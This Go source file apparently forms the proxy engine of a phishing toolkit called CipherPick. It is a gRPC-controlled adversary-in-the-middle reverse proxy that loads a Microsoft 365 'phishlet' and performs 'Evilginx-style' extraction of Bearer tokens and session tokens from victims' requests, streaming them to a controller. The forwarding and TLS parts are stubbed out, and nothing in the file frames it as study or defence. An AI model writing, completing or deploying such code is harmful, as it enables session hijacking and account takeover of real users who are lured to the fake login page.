package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"time"

	"google.golang.org/grpc"
	// pb "cipherpick/modules/mitm/proto/pb" // Assumed generated proto path
)

// MitmProxyServer represents the Go gRPC server
type MitmProxyServer struct {
	// pb.UnimplementedMitmProxyServer
	mu             sync.Mutex
	proxyRunning   bool
	activePhishlet string
	telemetryCh    chan TelemetryEvent // Channel for telemetry events
	httpServer     *http.Server
}

// TelemetryEvent structure representing the protobuf message for internal use
type TelemetryEvent struct {
	Type      int32
	SourceIP  string
	Payload   string
	Timestamp int64
}

// StartProxy handles the gRPC command to start the reverse proxy
func (s *MitmProxyServer) StartProxy(ctx context.Context, req interface{}) (interface{}, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.proxyRunning {
		return nil, fmt.Errorf("proxy is already running")
	}

	// req struct: ListenAddress, TargetDomain
	listenAddress := "0.0.0.0:443" // req.(*pb.StartRequest).ListenAddress

	// Initialize the high-performance reverse proxy
	go s.runReverseProxy(listenAddress)

	s.proxyRunning = true
	log.Printf("[+] Proxy Engine started on %s", listenAddress)

	// return &pb.StartResponse{Success: true, Message: "Proxy started successfully"}, nil
	return nil, nil
}

// StopProxy handles the gRPC command to stop the reverse proxy
func (s *MitmProxyServer) StopProxy(ctx context.Context, req interface{}) (interface{}, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if !s.proxyRunning || s.httpServer == nil {
		return nil, fmt.Errorf("proxy is not running")
	}

	s.httpServer.Close()
	s.proxyRunning = false
	log.Println("[-] Proxy Engine stopped")

	// return &pb.StopResponse{Success: true, Message: "Proxy stopped"}, nil
	return nil, nil
}

// LoadPhishlet handles loading dynamic interception configurations
func (s *MitmProxyServer) LoadPhishlet(ctx context.Context, req interface{}) (interface{}, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	// phishletName := req.(*pb.LoadPhishletRequest).PhishletName
	phishletName := "m365_enterprise"
	s.activePhishlet = phishletName

	log.Printf("[*] Loaded Phishlet Config: %s", phishletName)
	// return &pb.LoadPhishletResponse{Success: true, Message: "Phishlet loaded"}, nil
	return nil, nil
}

// StreamTelemetry handles the server-side streaming of intercepted events back to Python
func (s *MitmProxyServer) StreamTelemetry(req interface{}, stream grpc.ServerStream) error {
	log.Println("[*] Telemetry stream connected from Python Controller")
	
	for {
		select {
		case event := <-s.telemetryCh:
			// Send event over gRPC stream
			/*
			protoEvent := &pb.TelemetryEvent{
				Type:      pb.TelemetryEvent_EventType(event.Type),
				SourceIp:  event.SourceIP,
				Payload:   event.Payload,
				Timestamp: event.Timestamp,
			}
			if err := stream.Send(protoEvent); err != nil {
				log.Printf("[-] Telemetry stream error: %v", err)
				return err
			}
			*/
			_ = event // Mocking for boilerplate
		case <-stream.Context().Done():
			log.Println("[-] Telemetry stream disconnected")
			return nil
		}
	}
}

// runReverseProxy implements the core HTTP/S interception logic
func (s *MitmProxyServer) runReverseProxy(addr string) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", s.handleRequest)

	s.httpServer = &http.Server{
		Addr:    addr,
		Handler: mux,
	}

	// NOTE: In a real scenario, use ListenAndServeTLS with dynamic certificates
	// e.g., using a library like github.com/elazarl/goproxy or standard library custom cert generation
	if err := s.httpServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("Proxy HTTP server failed: %v", err)
	}
}

// handleRequest processes incoming HTTP requests, inspecting and modifying traffic
func (s *MitmProxyServer) handleRequest(w http.ResponseWriter, r *http.Request) {
	clientIP := r.RemoteAddr

	// 1. Read Request Body for Inspection
	bodyBytes, _ := io.ReadAll(r.Body)
	// Restore body for forwarding
	// r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))

	// 2. Perform Evilginx-style Token/Credential Extraction
	s.extractTokens(clientIP, r.Header, bodyBytes)

	// 3. Forward request to actual target (Boilerplate placeholder)
	// proxyReq, _ := http.NewRequest(r.Method, "https://target-domain.com"+r.URL.Path, bytes.NewReader(bodyBytes))
	// proxyReq.Header = r.Header
	// client := &http.Client{}
	// resp, err := client.Do(proxyReq)
	
	// 4. Inspect Response (e.g., check for HSTS headers, strip them)
	// if resp.Header.Get("Strict-Transport-Security") != "" {
	// 	 s.telemetryCh <- TelemetryEvent{Type: 2, SourceIP: clientIP, Payload: "HSTS Header Detected"}
	// }

	// Mocking Response
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Intercepted by CipherPick Go Proxy Engine"))
}

// extractTokens scans request headers and bodies for session tokens
func (s *MitmProxyServer) extractTokens(clientIP string, headers http.Header, body []byte) {
	// Example: Extract Authorization Bearer token
	authHeader := headers.Get("Authorization")
	if strings.HasPrefix(authHeader, "Bearer ") {
		token := strings.TrimPrefix(authHeader, "Bearer ")
		
		payload, _ := json.Marshal(map[string]string{
			"type":  "bearer_token",
			"value": token,
		})

		// Send to telemetry channel
		s.telemetryCh <- TelemetryEvent{
			Type:      1, // TOKEN_EXTRACTED
			SourceIP:  clientIP,
			Payload:   string(payload),
			Timestamp: time.Now().Unix(),
		}
	}

	// Example: Extract custom JSON tokens or session cookies
	// using regex matching on request body
	regex := regexp.MustCompile(`"session_token"\s*:\s*"([^"]+)"`)
	matches := regex.FindSubmatch(body)
	if len(matches) > 1 {
		payload, _ := json.Marshal(map[string]string{
			"type":  "session_token_json",
			"value": string(matches[1]),
		})
		
		s.telemetryCh <- TelemetryEvent{
			Type:      1,
			SourceIP:  clientIP,
			Payload:   string(payload),
			Timestamp: time.Now().Unix(),
		}
	}
}

func main() {
	listenAddr := "127.0.0.1:50051" // gRPC Server Address
	lis, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatalf("failed to listen: %v", err)
	}

	grpcServer := grpc.NewServer()
	
	mitmServer := &MitmProxyServer{
		telemetryCh: make(chan TelemetryEvent, 100),
	}

	// pb.RegisterMitmProxyServer(grpcServer, mitmServer)
	_ = mitmServer // Boilerplate stand-in

	log.Printf("[+] CipherPick Go Proxy Engine (gRPC) listening on %s", listenAddr)
	if err := grpcServer.Serve(lis); err != nil {
		log.Fatalf("failed to serve: %v", err)
	}
}
